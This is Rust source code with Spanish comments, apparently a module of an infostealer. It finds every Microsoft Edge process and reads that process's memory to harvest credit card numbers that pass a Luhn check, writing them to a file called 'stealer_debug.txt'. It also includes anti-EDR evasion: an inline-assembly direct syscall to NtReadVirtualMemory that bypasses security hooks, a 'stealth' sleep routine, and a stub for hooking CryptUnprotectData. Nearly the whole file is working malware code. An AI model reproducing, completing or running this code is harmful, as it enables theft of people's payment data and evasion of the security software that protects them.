// Memory Injection Anti-EDR
// Técnicas avanzadas para bypassear App-Bound Encryption leyendo memoria de Edge

use std::mem;
use winapi::um::winnt::{HANDLE, PROCESS_VM_READ, PROCESS_QUERY_INFORMATION, MEMORY_BASIC_INFORMATION, MEM_COMMIT, PAGE_READONLY, PAGE_READWRITE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE};
use winapi::um::processthreadsapi::OpenProcess;
use winapi::um::handleapi::CloseHandle;
use winapi::um::tlhelp32::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, 
    PROCESSENTRY32, TH32CS_SNAPPROCESS
};
use winapi::um::memoryapi::{ReadProcessMemory, VirtualQueryEx};
use winapi::shared::minwindef::{FALSE, LPVOID};
use obfstr::obfstr;


/// Estructura para almacenar información de proceso de Edge
#[derive(Debug)]
pub struct EdgeProcess {
    pub pid: u32,
    pub handle: HANDLE,
    pub base_address: usize,
}

/// Encuentra TODOS los procesos msedge.exe (main + renderers + utility)
pub fn find_all_edge_processes() -> Vec<EdgeProcess> {
    let mut processes = Vec::new();
    
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
            return processes;
        }

        let mut entry: PROCESSENTRY32 = mem::zeroed();
        entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;

        if Process32First(snapshot, &mut entry) == FALSE {
            CloseHandle(snapshot);
            return processes;
        }

        loop {
            let process_name = String::from_utf8_lossy(
                &entry.szExeFile.iter()
                    .take_while(|&&c| c != 0)
                    .map(|&c| c as u8)
                    .collect::<Vec<u8>>()
            ).to_lowercase();

            if process_name == obfstr!("msedge.exe") {
                let pid = entry.th32ProcessID;
                
                let handle = OpenProcess(
                    0x0010 | 0x0400 | 0x0008,  // VM_READ | QUERY_INFORMATION | VM_OPERATION
                    FALSE,
                    pid
                );

                if !handle.is_null() {
                    processes.push(EdgeProcess {
                        pid,
                        handle,
                        base_address: 0,
                    });
                }
            }

            if Process32Next(snapshot, &mut entry) == FALSE {
                break;
            }
        }

        CloseHandle(snapshot);
    }
    
    processes
}

/// Encuentra el primer proceso de msedge.exe (backward compatibility)
pub fn find_edge_process() -> Option<EdgeProcess> {
    find_all_edge_processes().into_iter().next()
}

/// Escanea TODOS los procesos Edge buscando tarjetas (función principal)
pub fn scan_all_edge_processes_for_cards() -> Vec<CreditCardData> {
    use std::io::Write;
    
    let debug_path = std::env::temp_dir().join("stealer_debug.txt");
    let mut debug_file = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&debug_path)
        .ok();
    
    let mut log = |msg: &str| {
        if let Some(ref mut file) = debug_file {
            let _ = writeln!(file, "{}", msg);
        }
    };
    
    let mut all_cards = Vec::new();
    let processes = find_all_edge_processes();
    
    log(&format!("🔍 [MULTI-PROCESS SCAN] Encontrados {} procesos msedge.exe", processes.len()));
    
    for (idx, process) in processes.iter().enumerate() {
        log(&format!("  📍 Escaneando proceso #{} - PID: {}", idx + 1, process.pid));
        
        let cards = scan_edge_memory_for_cards_internal(process, &mut log);
        
        if !cards.is_empty() {
            log(&format!("    ✅ Encontradas {} tarjetas en PID {}", cards.len(), process.pid));
            all_cards.extend(cards);
        } else {
            log(&format!("    ⏭️  Sin tarjetas en PID {}", process.pid));
        }
    }
    
    log(&format!("🎯 [MULTI-PROCESS SCAN] Total: {} tarjetas encontradas en {} procesos", 
        all_cards.len(), processes.len()));
    
    all_cards
}

/// Escanea memoria de UN proceso Edge (función interna más silenciosa)
fn scan_edge_memory_for_cards_internal<F>(edge: &EdgeProcess, log: &mut F) -> Vec<CreditCardData>
where
    F: FnMut(&str),
{
    let mut cards = Vec::new();
    
    unsafe {
        const CHUNK_SIZE: usize = 4096;
        let mut address: usize = 0x10000;
        let mut buffer = vec![0u8; CHUNK_SIZE];
        let mut pages_scanned = 0;
        let mut pages_readable = 0;
        let mut regions_checked = 0;
        let mut regions_valid = 0;
        
        while address < 0x7FFF_0000 && regions_checked < 50000 && pages_scanned < 10000 {
            let mut mbi: MEMORY_BASIC_INFORMATION = mem::zeroed();
            let query_result = VirtualQueryEx(
                edge.handle,
                address as LPVOID,
                &mut mbi as *mut MEMORY_BASIC_INFORMATION,
                mem::size_of::<MEMORY_BASIC_INFORMATION>()
            );
            
            regions_checked += 1;
            
            if query_result == 0 {
                address += 0x10000;
                continue;
            }
            
            let is_readable = (mbi.Protect & PAGE_READONLY != 0) 
                || (mbi.Protect & PAGE_READWRITE != 0)
                || (mbi.Protect & PAGE_EXECUTE_READ != 0)
                || (mbi.Protect & PAGE_EXECUTE_READWRITE != 0);
            
            if mbi.State == MEM_COMMIT && is_readable && mbi.RegionSize > 0 {
                regions_valid += 1;
                
                let region_start = address;
                let region_end = (region_start + mbi.RegionSize as usize).min(0x7FFF_0000);
                let mut region_addr = region_start;
                
                let mut pages_in_region = 0;
                while region_addr < region_end && pages_scanned < 10000 && pages_in_region < 256 {
                    let mut bytes_read: usize = 0;
                    
                    let result = ReadProcessMemory(
                        edge.handle,
                        region_addr as LPVOID,
                        buffer.as_mut_ptr() as LPVOID,
                        CHUNK_SIZE,
                        &mut bytes_read as *mut usize
                    );
                    
                    pages_scanned += 1;
                    pages_in_region += 1;
                    
                    if result != 0 && bytes_read > 0 {
                        pages_readable += 1;
                        
                        // DEBUG: Verificar si contiene strings legibles
                        let sample = String::from_utf8_lossy(&buffer[..bytes_read.min(100)]);
                        let has_text = sample.chars().filter(|c| c.is_alphanumeric()).count() > 10;
                        
                        if has_text && pages_in_region < 3 {
                            log(&format!("        📄 Región legible - Sample: {:?}", &sample[..sample.len().min(60)]));
                        }
                        
                        if let Some(card) = search_credit_card_pattern(&buffer[..bytes_read]) {
                            log(&format!("      💳 Card found: {} (exp {}/{})", 
                                card.card_number,
                                card.expiry_month.unwrap_or(0),
                                card.expiry_year.unwrap_or(0)));
                            cards.push(card);
                        }
                    }
                    
                    region_addr += CHUNK_SIZE;
                    
                    if cards.len() > 50 {
                        break;
                    }
                }
                
                address = region_end;
            } else {
                let next_address = address.saturating_add(mbi.RegionSize as usize);
                address = next_address.min(0x7FFF_0000);
            }
        }
        
        if !cards.is_empty() {
            log(&format!("      Stats: {} regiones válidas, {} páginas leídas", 
                regions_valid, pages_readable));
        }
    }
    
    cards
}

/// Escanea memoria del proceso Edge buscando patrones de tarjetas (wrapper para compatibilidad)
pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
    use std::io::Write;
    
    let debug_path = std::env::temp_dir().join("stealer_debug.txt");
    let mut debug_file = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&debug_path)
        .ok();
    
    let mut log = |msg: &str| {
        if let Some(ref mut file) = debug_file {
            let _ = writeln!(file, "{}", msg);
        }
    };
    
    let mut cards = Vec::new();
    
    log("  🔍 [MEMORY SCAN] Iniciando escaneo...");
    log(&format!("    PID: {}", edge.pid));
    log(&format!("    Handle: {:?}", edge.handle));
    log("    Rango: 0x00010000 - 0x7FFF0000 (empezando desde 64KB)");
    
    unsafe {
        // Escanear memoria usando VirtualQueryEx para encontrar regiones válidas
        const CHUNK_SIZE: usize = 4096; // 4KB pages
        let mut address: usize = 0x10000; // Empezar después de NULL pages
        let mut buffer = vec![0u8; CHUNK_SIZE];
        let mut pages_scanned = 0;
        let mut pages_readable = 0;
        let mut regions_checked = 0;
        let mut regions_valid = 0;
        let mut first_error_logged = false;
        
        log("    Usando VirtualQueryEx para encontrar regiones válidas...");
        
        // Escanear hasta 2GB (rango típico de user-mode)
        while address < 0x7FFF_0000 {
            // Primero, query la región de memoria
            let mut mbi: MEMORY_BASIC_INFORMATION = mem::zeroed();
            let query_result = VirtualQueryEx(
                edge.handle,
                address as LPVOID,
                &mut mbi as *mut MEMORY_BASIC_INFORMATION,
                mem::size_of::<MEMORY_BASIC_INFORMATION>()
            );
            
            regions_checked += 1;
            
            if query_result == 0 {
                // Query falló, saltar 64KB
                address += 0x10000;
                continue;
            }
            
            // Solo leer regiones committed y con permisos de lectura
            let is_readable = (mbi.Protect & PAGE_READONLY != 0) 
                || (mbi.Protect & PAGE_READWRITE != 0)
                || (mbi.Protect & PAGE_EXECUTE_READ != 0)
                || (mbi.Protect & PAGE_EXECUTE_READWRITE != 0);
            
            if mbi.State == MEM_COMMIT && is_readable && mbi.RegionSize > 0 {
                regions_valid += 1;
                
                // Esta región es válida, escanearla en chunks
                let region_start = address;
                let region_end = (region_start + mbi.RegionSize as usize).min(0x7FFF_0000);
                let mut region_addr = region_start;
                
                log(&format!("    ✅ Región válida #{}: 0x{:08X}-0x{:08X} ({} KB)", 
                    regions_valid, region_start, region_end, mbi.RegionSize / 1024));
                
                // Escanear esta región en chunks (máximo 256 páginas por región)
                let mut pages_in_region = 0;
                while region_addr < region_end && pages_scanned < 50000 && pages_in_region < 256 {
                    let mut bytes_read: usize = 0;
                    
                    // ReadProcessMemory
                    let result = ReadProcessMemory(
                        edge.handle,
                        region_addr as LPVOID,
                        buffer.as_mut_ptr() as LPVOID,
                        CHUNK_SIZE,
                        &mut bytes_read as *mut usize
                    );
                    
                    pages_scanned += 1;
                    pages_in_region += 1;
                    
                    if result != 0 && bytes_read > 0 {
                        pages_readable += 1;
                        
                        // Buscar patrones de números de tarjeta en memoria
                        if let Some(card) = search_credit_card_pattern(&buffer[..bytes_read]) {
                            log(&format!("    ✅ Card found at address 0x{:08X}: {}", region_addr, card.card_number));
                            cards.push(card);
                        }
                    } else if !first_error_logged {
                        use winapi::um::errhandlingapi::GetLastError;
                        let error_code = GetLastError();
                        log(&format!("    ⚠️ Primer ReadProcessMemory falló - Error code: {} (0x{:X})", error_code, error_code));
                        first_error_logged = true;
                    }
                    
                    region_addr += CHUNK_SIZE;
                    
                    if cards.len() > 100 {
                        break;
                    }
                }
                
                // Saltar al final de la región
                address = region_end;
            } else {
                // Región no válida: saltar su tamaño completo
                // Si es MEM_FREE (0x10000), puede ser enorme (GB), saltarla completamente
                let next_address = address.saturating_add(mbi.RegionSize as usize);
                address = next_address.min(0x7FFF_0000); // No salir del rango user-mode
                
                if regions_checked < 10 {
                    log(&format!("    ⏭️  Región inválida: 0x{:08X} (State={:X}, Protect={:X}, Size={} KB)", 
                        address, mbi.State, mbi.Protect, mbi.RegionSize / 1024));
                }
            }
            
            // Límite de regiones chequeadas aumentado
            if regions_checked > 100000 || pages_scanned > 50000 || cards.len() > 100 {
                break;
            }
        }
        
        log(&format!("  📊 [MEMORY SCAN] Estadísticas:"));
        log(&format!("    Regiones verificadas: {}", regions_checked));
        log(&format!("    Regiones válidas (COMMIT+readable): {}", regions_valid));
        log(&format!("    Páginas escaneadas: {}", pages_scanned));
        log(&format!("    Páginas legibles: {}", pages_readable));
        log(&format!("    Tarjetas encontradas: {}", cards.len()));
    }
    
    cards
}


/// Representa datos de tarjeta de crédito encontrados
#[derive(Debug, Clone)]
pub struct CreditCardData {
    pub card_number: String,
    pub expiry_month: Option<u8>,
    pub expiry_year: Option<u16>,
    pub cardholder_name: Option<String>,
    pub cvv: Option<String>,
}

/// Busca patrones de números de tarjeta en buffer de memoria
/// Usa regex optimizado y validación de Luhn
fn search_credit_card_pattern(buffer: &[u8]) -> Option<CreditCardData> {
    // Convertir a string (ignorando bytes no-UTF8)
    let text = String::from_utf8_lossy(buffer);
    
    // NUEVO: Buscar el string "4111" específicamente (tarjeta de prueba)
    if text.contains("4111") {
        // Log para debug
        use std::io::Write;
        let debug_path = std::env::temp_dir().join("stealer_debug.txt");
        if let Ok(mut file) = std::fs::OpenOptions::new().create(true).append(true).open(&debug_path) {
            let _ = writeln!(file, "        🔍 DEBUG: Encontrado '4111' en memoria!");
            
            // Extraer contexto (50 chars antes y después)
            if let Some(pos) = text.find("4111") {
                let start = pos.saturating_sub(50);
                let end = (pos + 50).min(text.len());
                let context = &text[start..end];
                let _ = writeln!(file, "        📝 Contexto: {:?}", context);
            }
        }
    }
    
    // Buscar secuencias de dígitos (números de tarjeta)
    // Patrones: 4xxx (Visa), 5xxx (MasterCard), 3xxx (Amex), 6xxx (Discover)
    
    let mut start = 0;
    while start < text.len() {
        // Buscar inicio de número potencial (4, 5, 3, 6)
        if let Some(pos) = text[start..].find(|c: char| c == '4' || c == '5' || c == '3' || c == '6') {
            start += pos;
            
            // Extraer siguiente secuencia, permitiendo espacios y guiones
            let raw_segment: String = text[start..]
                .chars()
                .take(30) // Suficiente para "4111 1111 1111 1111"
                .collect();
            
            // Extraer solo dígitos
            let digits: String = raw_segment
                .chars()
                .filter(|c| c.is_ascii_digit())
                .take(19)
                .collect();
            
            // Validar longitud (13-19 dígitos) y algoritmo de Luhn
            if digits.len() >= 13 && digits.len() <= 19 {
                if validate_luhn(&digits) {
                    return Some(CreditCardData {
                        card_number: format_card_number(&digits),
                        expiry_month: None,
                        expiry_year: None,
                        cardholder_name: None,
                        cvv: None,
                    });
                }
            }
            
            start += 1;
        } else {
            break;
        }
    }
    
    None
}

/// Valida número de tarjeta usando algoritmo de Luhn
fn validate_luhn(card_number: &str) -> bool {
    let digits: Vec<u32> = card_number
        .chars()
        .filter_map(|c| c.to_digit(10))
        .collect();
    
    if digits.is_empty() {
        return false;
    }
    
    let mut sum = 0;
    let mut double = false;
    
    // Iterar de derecha a izquierda
    for &digit in digits.iter().rev() {
        let mut d = digit;
        
        if double {
            d *= 2;
            if d > 9 {
                d -= 9;
            }
        }
        
        sum += d;
        double = !double;
    }
    
    sum % 10 == 0
}

/// Formatea número de tarjeta con espacios
fn format_card_number(digits: &str) -> String {
    digits.chars()
        .enumerate()
        .flat_map(|(i, c)| {
            if i > 0 && i % 4 == 0 {
                vec![' ', c]
            } else {
                vec![c]
            }
        })
        .collect()
}

/// API Hooking usando MinHook (más avanzado)
/// Hook de CryptUnprotectData para capturar plaintext
#[cfg(feature = "advanced_hooks")]
pub mod api_hooks {
    use super::*;
    use std::sync::Mutex;
    
    static CAPTURED_DATA: Mutex<Vec<Vec<u8>>> = Mutex::new(Vec::new());
    
    /// Hook CryptUnprotectData para interceptar desencriptación
    pub fn hook_dpapi() -> Result<(), String> {
        // TODO: Implementar usando MinHook o Detours
        // Por ahora solo estructura
        Ok(())
    }
    
    /// Obtiene datos capturados por hooks
    pub fn get_captured_data() -> Vec<Vec<u8>> {
        CAPTURED_DATA.lock().unwrap().clone()
    }
}

/// Técnicas anti-EDR avanzadas
pub mod anti_edr {
    use super::*;
    
    /// Direct Syscall para NtReadVirtualMemory (bypass de hooks)
    #[cfg(target_arch = "x86_64")]
    pub unsafe fn nt_read_virtual_memory_syscall(
        process_handle: HANDLE,
        base_address: LPVOID,
        buffer: LPVOID,
        size: usize,
        bytes_read: *mut usize
    ) -> i32 {
        // Syscall number para NtReadVirtualMemory en Windows 10/11
        const SYSCALL_NUMBER: u32 = 0x3F;
        
        // Assembly inline para ejecutar syscall directo
        let result: i32;
        std::arch::asm!(
            "mov r10, rcx",
            "mov eax, {syscall}",
            "syscall",
            "ret",
            syscall = const SYSCALL_NUMBER,
            in("rcx") process_handle,
            in("rdx") base_address,
            in("r8") buffer,
            in("r9") size,
            lateout("rax") result,
        );
        
        result
    }
    
    /// Sleep ofuscado para evitar detección de timing
    pub fn stealth_sleep(ms: u32) {
        use std::thread;
        use std::time::Duration;
        
        // Dividir sleep en chunks aleatorios
        let chunks = (ms / 100) + 1;
        for _ in 0..chunks {
            thread::sleep(Duration::from_millis(50 + (ms % 50) as u64));
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_luhn_validation() {
        // Visa test card
        assert!(validate_luhn("4532015112830366"));
        
        // Invalid number
        assert!(!validate_luhn("1234567890123456"));
    }
    
    #[test]
    fn test_find_edge() {
        if let Some(edge) = find_edge_process() {
            println!("Found Edge PID: {}", edge.pid);
        }
    }
}
